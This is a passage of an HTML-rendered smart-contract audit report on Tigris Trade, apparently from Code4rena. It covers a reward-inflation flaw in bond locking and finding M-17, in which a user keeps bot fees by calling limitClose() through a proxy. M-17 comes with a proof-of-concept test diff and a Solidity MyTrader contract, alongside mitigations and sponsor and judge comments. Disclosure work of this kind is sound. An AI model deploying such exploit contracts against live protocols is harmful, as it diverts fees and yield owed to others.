class=\"grvsc-source\">            _mint(_owner, _bond);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit Lock(_asset, _amount, _period, _owner, id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>If a bond gets wrong value for mint epoch, it would have wrong value for expired epoch and user would get a lot of shares by lock for small time. </p>\n<p>For example this scenario:</p>\n<ol>\n<li>Let’s assume <code>epoch[asset1]</code> is outdated and it shows 30 days ago epoch. (<code>allowedAsset[asset1]</code> was false so locking was not possible and then is set as true after 30 days)</li>\n<li>During this time, because <code>totalShare[asset1]</code> was 0, the <code>distribute()</code> function won’t update <code>epoch[asset1]</code> and <code>epoch[asset1]</code> would show 30 days ago.</li>\n<li>Attacker would create a lock for 32 days by calling <code>Lock.lock(asset1)</code>. Code would call <code>BondNFT.createLock()</code> and would create a bond for attacker which epoch start time is 30 days ago and epoch expire time is 2 days later and attacker receives shares for 32 days.</li>\n<li>Some reward would get distributed into the BondNFT for the <code>asset1</code>.</li>\n<li>Other users would create lock too.</li>\n<li>Attacker would claim his rewards and his rewards would be for 32 day locking but attacker lock his tokens for 2 days in reality.</li>\n</ol>\n<p>So attacker was able to create lock for a long time and get shares and rewards based on that, but attacker can release lock after short time.</p>\n<h3 id=\"tools-used-12\" style=\"position:relative;\"><a href=\"#tools-used-12\" aria-label=\"tools used 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Update <code>epoch[asset]</code> in <code>distribute()</code> function  even when <code>totalShares[_tigAsset]</code> is equal to 0. Only the division by zero and fund transfer should be prevented when totalShare is zero and <code>epoch[asset]</code> index should be updated.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/436\">TriHaz (Tigris Trade) confirmed</a></strong> </p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/436#issuecomment-1387141618\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown a set of circumstances that would allow a locker to lock their tokens for a relatively short period of time, while gaining extra rewards for up to one Epoch.</p>\n<p>Because the finding is limited to a theft of yield, I believe it to be of Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/436#issuecomment-1407773295\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176233\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176233</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-17-user-can-close-an-order-via-limitclose-and-take-bot-fees-to-themselves\" style=\"position:relative;\"><a href=\"#m-17-user-can-close-an-order-via-limitclose-and-take-bot-fees-to-themselves\" aria-label=\"m 17 user can close an order via limitclose and take bot fees to themselves permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/468\">[M-17] User can close an order via <code>limitClose()</code>, and take bot fees to themselves</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/468\">0xA5DF</a></em></p>\n<p>Bot fees are used when a position is opened/closed via a bot. In that case a bot fee is subtracted from the DAO fee and sent to the closing bot.\nA user can use that  to reduce the DAO fees for closing an order and keeping it to themselves.</p>\n<p>Instead of closing the order via <code>initiateClose()</code>, the user can use a proxy contract to update the stop-loss value and then <code>limitClose()</code> the order.\nSince that is done in one function call, no bot can run the <code>limitClose()</code> and the bot fee will go to the user.</p>\n<h3 id=\"proof-of-concept-27\" style=\"position:relative;\"><a href=\"#proof-of-concept-27\" aria-label=\"proof of concept 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following PoC shows how a trade is closed by a proxy contract that sets the limit and closes it via <code>limitClose()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/07.Trading.js b/test/07.Trading.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index ebe9948..e50b0cc 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/07.Trading.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/07.Trading.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -17,6 +17,7 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   let TradingExtension;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   let tradingExtension;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  let myTrader;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   let TradingLibrary;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   let tradinglibrary;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -37,7 +38,7 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   let MockDAI;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   let MockUSDC;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  let mockusdc;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  let mockusdc, mockdai;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   let badstablevault;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -55,6 +56,7 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     const Position = await deployments.get(&quot;Position&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     position = await ethers.getContractAt(&quot;Position&quot;, Position.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     MockDAI = await deployments.get(&quot;MockDAI&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    mockdai = await ethers.getContractAt(&quot;MockERC20&quot;, MockDAI.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     MockUSDC = await deployments.get(&quot;MockUSDC&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mockusdc = await ethers.getContractAt(&quot;MockERC20&quot;, MockUSDC.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     const PairsContract = await deployments.get(&quot;PairsContract&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -84,6 +86,10 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     TradingLibrary = await deployments.get(&quot;TradingLibrary&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     tradinglibrary = await ethers.getContractAt(&quot;TradingLibrary&quot;, TradingLibrary.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     await trading.connect(owner).setLimitOrderPriceRange(1e10);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    let mtFactory = await ethers.getContractFactory(&quot;MyTrader&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    myTrader = await mtFactory.deploy(Trading.address, Position.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   describe(&quot;Check onlyOwner and onlyProtocol&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     it(&quot;Set max win percent&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -536,6 +542,31 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Trade has opened</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(await stabletoken.balanceOf(owner.address)).to.equal(parseEther(&quot;0&quot;)); // Should no tigAsset left</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    it(&quot;Test my trader&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let TradeInfo = [parseEther(&quot;1000&quot;), MockDAI.address, StableVault.address, parseEther(&quot;10&quot;), 0, true, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let PriceData = [node.address, 0, parseEther(&quot;20000&quot;), 0, 2000000000, false];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let message = ethers.utils.keccak256(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ethers.utils.defaultAbiCoder.encode(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          [node.address, 0, parseEther(&quot;20000&quot;), 0, 2000000000, false]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let sig = await node.signMessage(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        Buffer.from(message.substring(2), &#39;hex&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await trading.connect(owner).approveProxy(myTrader.address, 1e10);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await myTrader.connect(owner).closeTrade(1, PriceData, sig);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     it(&quot;Closing over 100% should revert&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let TradeInfo = [parseEther(&quot;1000&quot;), MockDAI.address, StableVault.address, parseEther(&quot;10&quot;), 0, true, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let PriceData = [node.address, 0, parseEther(&quot;20000&quot;), 0, 2000000000, false];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -551,8 +582,10 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       await expect(trading.connect(owner).initiateCloseOrder(1, 1e10+1, PriceData, sig, StableVault.address, StableToken.address, owner.address)).to.be.revertedWith(&quot;BadClosePercent&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     it(&quot;Closing 0% should revert&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let TradeInfo = [parseEther(&quot;1000&quot;), MockDAI.address, StableVault.address, parseEther(&quot;10&quot;), 0, true, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let PriceData = [node.address, 0, parseEther(&quot;20000&quot;), 0, 2000000000, false];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -700,6 +733,7 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(margin).to.equal(parseEther(&quot;500&quot;));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   describe(&quot;Trading using &lt;18 decimal token&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     it(&quot;Opening and closing a position with tigUSD output&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       await pairscontract.connect(owner).setAssetBaseFundingRate(0, 0); // Funding rate messes with results because of time</span></span></span></code></pre>\n<p><code>MyTrader.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ITrading</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../interfaces/ITrading.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../utils/TradingLibrary.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../interfaces/IPosition.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MyTrader</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ITrading</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IPosition</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">external</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_trading</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_position</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">trading</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ITrading</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_trading</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_position</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">closeTrade</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">PriceData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_signature</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tp</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateTpSl</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_signature</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">limitClose</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_signature</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Don’t allow updating sl or tp and executing <code>limitClose()</code> at the same block.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/468#issuecomment-1372980585\">TriHaz (Tigris Trade) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Valid and will be confirmed, but not sure about the severity, as the protocol will not lose anything because fees would be paid to another bot anyway. Would like an opinion from a judge.</p>\n</blockquote>\n<p><strong><a 